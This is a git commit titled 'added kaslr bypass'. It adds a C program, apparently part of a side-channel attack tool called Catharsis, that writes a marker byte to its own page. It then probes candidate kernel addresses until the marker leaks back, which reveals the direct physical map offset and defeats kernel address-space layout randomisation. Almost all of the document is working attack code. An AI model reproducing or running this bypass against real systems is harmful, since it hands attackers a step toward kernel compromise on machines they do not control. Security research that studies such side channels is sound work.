3604728e0b7ee5f293bcd287d4aeb8ec43ebf701
Timo S <58859419+timo-cmd@users.noreply.github.com>
2020-12-16 09:13:44 +0100

    added kaslr bypass

--- sources/kernel.c
+++ sources/kernel.c
@@ -1,4 +1,55 @@
 #include <stdio.h>
-#include <stdint.h>
-#include <stdbool.h>
-#include <string.h>
+#include <stdlib.h>
+
+#include "dump.h"
+
+int main( int argc, char *argv[] ) {
+    size_t scratch[4096];
+    dump_config_t config;
+    size_t offset = DEFAULT_PHYSICAL_OFFSET;
+#ifdef __x86_64__
+    size_t step = 0x800000000ll;
+#else 
+    size_t step = 0x1000000;
+#endif
+
+    size_t delta = -2 * step;
+    int progress = 0;
+
+    dump_enable_debug( 0 );
+    config = dump_get_autoconfig();
+    config.retries = 10;
+    config.measurements = 1;
+
+    dump_init( config );
+    size_t var = (size_t)(scratch + 2048);
+    *(char*)var = 'X';
+
+    size_t start = dump_virt_to_phys(var);
+    if (!start) {
+        printf("\x1b[31;1m[!]\x1b[0m Catharsis requires root privileges (or read access to /proc/<pid>/pagemap)!\n");
+        exit(1);
+    }
+
+    while ( 1 ) {
+    *(volatile char *)var = 'X';
+    *(volatile char *)var = 'X';
+    *(volatile char *)var = 'X';
+    *(volatile char *)var = 'X';
+    *(volatile char *)var = 'X';
+
+    int res = dump_read(start + offset + delta);
+    if (res == 'X') {
+      printf("\r\x1b[32;1m[+]\x1b[0m Direct physical map offset: \x1b[33;1m0x%zx\x1b[0m\n", offset + delta);
+      fflush(stdout);
+      break;
+    } else {
+      delta += step;
+      if (delta >= -1ull - offset) {
+        delta = 0;
+        step >>= 4;
+      }
+      printf("\r\x1b[34;1m[%c]\x1b[0m 0x%zx    ", "/-\\|"[(progress++ / 400) % 4], offset + delta);
+    }
+  }
+}
